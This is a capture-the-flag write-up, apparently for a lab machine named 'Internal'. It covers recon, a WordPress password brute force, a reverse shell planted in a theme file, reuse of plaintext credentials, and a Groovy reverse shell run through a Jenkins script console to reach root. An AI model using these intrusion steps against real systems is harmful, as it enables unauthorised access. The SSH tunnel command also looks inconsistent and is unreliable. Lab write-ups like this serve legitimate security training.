# Internal 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:
    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

# Recon

`sudo nmap -A -T4 internal.thm`

```
22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                    
| ssh-hostkey:                                                                                                                                                                  
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)                                                                                                                  
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)                                                                                                                 
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)                                                                                                               
80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))                                                                                                                  
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                    
|_http-title: Apache2 Ubuntu Default Page: It works   
```

# Gobuster 
`gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,css,json,js,txt,xml`


```
blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
```

# Version Disclosure 
Clicking "Entries feed" => Results in download of RSS summary

```
<channel>
	<title>Internal</title>
	<atom:link href="http://internal.thm/blog/index.php/feed/" rel="self" type="application/rss+xml" />
	<link>http://internal.thm/blog</link>
	<description>Just another WordPress site</description>
	<lastBuildDate>Mon, 03 Aug 2020 13:19:02 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.4.2</generator>
	<item>
		<title>Hello world!</title>
		<link>http://internal.thm/blog/index.php/2020/08/03/hello-world/</link>
					<comments>http://internal.thm/blog/index.php/2020/08/03/hello-world/#comments</comments>
		
		<dc:creator><![CDATA[admin]]></dc:creator>
		<pubDate>Mon, 03 Aug 2020 13:19:02 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://192.168.1.45/blog/?p=1</guid>

					<description><![CDATA[Welcome to WordPress. This is your first post. Edit or delete it, then start writing!]]></description>
										<content:encoded><![CDATA[
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
]]></content:encoded>
					
					<wfw:commentRss>http://internal.thm/blog/index.php/2020/08/03/hello-world/feed/</wfw:commentRss>
			<slash:comments>1</slash:comments>
		
		
			</item>
	</channel>
</rss>
```

# Vulnerability Assessment with WPScan
`wpscan --url http://internal.thm/blog/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt`

```
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

# Initial Access

Dashboard > Appearance > Themes > Theme Editor > Edit functions.php 
Insert revshell php 

/opt/wp-save.txt
```
www-data@internal:/tmp$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
`su aubreanna`

User flag obtained. 


# Pivoting
`ss -tuln`

```
Netid     State        Recv-Q       Send-Q                   Local Address:Port              Peer Address:Port      
udp       UNCONN       0            0                        127.0.0.53%lo:53                     0.0.0.0:*         
udp       UNCONN       0            0                   10.82.159.139%eth0:68                     0.0.0.0:*         
tcp       LISTEN       0            128                          127.0.0.1:44007                  0.0.0.0:*         
tcp       LISTEN       0            80                           127.0.0.1:3306                   0.0.0.0:*         
tcp       LISTEN       0            128                          127.0.0.1:8080                   0.0.0.0:*         
tcp       LISTEN       0            128                      127.0.0.53%lo:53                     0.0.0.0:*         
tcp       LISTEN       0            128                            0.0.0.0:22                     0.0.0.0:*         
tcp       LISTEN       0            128                                  *:80                           *:*         
tcp       LISTEN       0            128                               [::]:22                        [::]:*  
```

`ssh -L 8080:localhost:3333`

Visiting `localhost:8080` => Jenkins logon page 

Intercept localhost:3333 login and bruteforce creds
	`admin:spongebob`

Login to Jenkins 
Generate Groovy revshell code from `revshells.com`
Run code on Jenkins script console 

# PrivEsc

`/opt/note.txt`

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Root flag obtained